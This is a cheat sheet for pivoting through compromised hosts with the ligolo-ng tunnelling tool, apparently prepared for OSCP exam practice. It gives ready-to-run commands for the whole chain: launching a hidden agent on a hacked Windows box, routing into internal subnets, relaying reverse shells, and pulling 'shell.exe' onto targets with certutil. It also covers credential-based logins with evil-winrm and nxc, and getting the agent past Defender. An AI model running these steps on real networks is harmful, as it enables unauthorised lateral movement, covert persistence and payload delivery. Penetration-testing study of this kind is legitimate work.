# Ligolo-ng Cheat Sheet (OSCP)

Quick reference for pivoting with ligolo-ng v0.8.x. Built around the assumed-breach AD flow.

**The one rule to remember:** ligolo is **two programs on two machines**.
`proxy` runs on **your Kali** (never moves). `agent` runs on the **hacked box** (the pivot).

---

## 0. Prep (do this BEFORE the exam)

Download both binaries from the releases page and stage them in your webserver dir.

```bash
# Print all download URLs for the latest release
curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest \
  | grep browser_download_url | cut -d '"' -f4
```

Pull down ahead of time:
- `ligolo-ng_proxy_*_linux_amd64.tar.gz`  -> your Kali
- `ligolo-ng_agent_*_windows_amd64.zip`   -> Windows targets (`agent.exe`)
- `ligolo-ng_agent_*_windows_386.zip`     -> 32-bit Windows fallback
- `ligolo-ng_agent_*_linux_amd64.tar.gz`  -> Linux targets

```bash
tar -xvzf ligolo-ng_proxy_*_linux_amd64.tar.gz   # gives you: proxy
```

---

## 1. Kali side: start the proxy

```bash
sudo ./proxy -selfcert
```

- Needs `sudo` (it creates a virtual network interface).
- Default listen port is **11601**.
- Drops you into the `ligolo-ng »` console. Leave this terminal open.

Then create the tunnel interface (v0.6+, no more `ip tuntap`):

```
ligolo-ng » interface_create --name ligolo
```

Setup on the Kali side is now DONE. It's waiting for an agent to connect.

---

## 2. Target side: run the agent

Only after you have a shell on the box. Transfer `agent.exe` / `agent`, then:

```powershell
# Windows
.\agent.exe -connect 192.168.45.200:11601 -ignore-cert
```
```bash
# Linux
./agent -connect 192.168.45.200:11601 -ignore-cert
```

`192.168.45.200` = your Kali VPN IP.

Useful flags:
- `-ignore-cert`   accept the self-signed cert (needed with `-selfcert`)
- `-retry 10`      retry if the connection is flaky

Agent does **NOT** need admin. It runs fine as a low-priv user.

Keep it alive on Windows (survives your shell dying):
```powershell
Start-Process -WindowStyle Hidden .\agent.exe -ArgumentList "-connect 192.168.45.200:11601 -ignore-cert"
```

---

## 3. Kali side: start the tunnel

Back in the `ligolo-ng »` console, the agent should now show up.

```
ligolo-ng » session
[select your agent from the list]
[Agent : user@HOST] » tunnel_start --tun ligolo
```

(Older builds: the command is just `start --tun ligolo`.)

---

## 4. Add routes — the lazy way

```
[Agent : user@HOST] » autoroute
```

Reads the agent's own routing table, shows you the subnets it can reach, lets you
pick which to route, and creates the interface + kernel routes for you. Use this.

Manual equivalent (if you want one specific subnet):
```
ligolo-ng » interface_add_route --name ligolo --route 10.10.10.0/24
```

Now scans and connections from Kali reach the internal subnet natively:
```bash
nmap -sT -Pn -p 135,139,445,3389,5985 10.10.10.20
nxc smb 10.10.10.20 -u svc-sql -p 'Summer2023!'
evil-winrm -i 10.10.10.20 -u svc-sql -p 'Summer2023!'
```

---

## 5. THE GOTCHA: reverse shells & file hosting through the pivot

The internal target has **no route back to your Kali**. So:

- Things Kali **connects OUT to** (nxc, evil-winrm, nmap) -> work natively, nothing extra.
- Things that must **connect BACK to** Kali (reverse shells, `certutil` pulling a
  payload off your webserver) -> **need a listener on the pivot.**

Add a listener on the agent that relays a port back to you:

```
# Catch a reverse shell: pivot:4444  ->  your Kali 127.0.0.1:4444
[Agent : PIVOT] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Host a payload: pivot:80  ->  your Kali Python server on 80
[Agent : PIVOT] » listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```

Then point the target at the **PIVOT's internal IP**, not your Kali:
```
# reverse shell payload  ->  LHOST = pivot internal IP (e.g. 10.10.10.10), LPORT = 4444
# on the target: certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe
```

List / remove listeners:
```
[Agent : PIVOT] » listener_list
[Agent : PIVOT] » listener_delete --id 0
```

**Memory rule:** connect OUT from Kali = free through the tunnel.
Connect BACK to Kali = needs a ligolo listener on the pivot.

---

## 6. Reach the pivot's OWN localhost (127.0.0.1 services)

Services bound to `127.0.0.1` on the pivot (internal web apps, databases) are
reachable from Kali via the magic address **240.0.0.1**:

```
ligolo-ng » interface_add_route --name ligolo --route 240.0.0.1/32
```
```bash
mysql -h 240.0.0.1 -u root -p
curl http://240.0.0.1:8080
```

---

## 7. Double pivot (network behind the network)

`Kali -> WS01 (pivot1) -> WS02 (pivot2) -> deeper subnet`

On **pivot1's** agent session, open a relay so a second agent can reach your proxy:
```
[Agent : pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

Run a second agent on **pivot2**, connecting to **pivot1's internal IP**:
```powershell
.\agent.exe -connect 10.10.10.5:11601 -ignore-cert
```

Back on Kali, wire up the second tunnel:
```
ligolo-ng » session                         # pick the new pivot2 session
ligolo-ng » interface_create --name ligolo2
[Agent : pivot2] » tunnel_start --tun ligolo2
[Agent : pivot2] » autoroute                # pick the deeper subnet
```

---

## 8. Gotchas checklist

- [ ] **Proxy needs `sudo`** (tun creation). Agent does not need admin.
- [ ] **proxychains only handles TCP** — if you ever fall back to it, use `nmap -sT -Pn`.
      With ligolo's TUN you don't need proxychains at all.
- [ ] **Defender eats stock `agent.exe`** on some boxes. Fallback: chisel, or compile
      the agent yourself from source.
- [ ] **Proxy on Windows** instead of Linux? You need `wintun.dll` (from WireGuard)
      next to the binary.
- [ ] **Scan the pivoted box before assuming a shell method** — WS01 having 5985 open
      doesn't mean WS02 does. `nmap -sT -Pn` first, then pick evil-winrm vs impacket.
- [ ] **Don't gate the pivot on admin or on privesc** — deploy it as soon as `ipconfig`
      shows a second subnet you can't otherwise reach.

---

## 9. One-glance flow

```
sudo ./proxy -selfcert                        # Kali: start proxy
  interface_create --name ligolo              # Kali: make tunnel iface
--- get shell on target ---
.\agent.exe -connect KALI_IP:11601 -ignore-cert   # target: run agent
  session ; tunnel_start --tun ligolo         # Kali: start tunnel
  autoroute                                   # Kali: route internal subnet
--- reverse shell / file host? ---
  listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp   # relay back to Kali
```
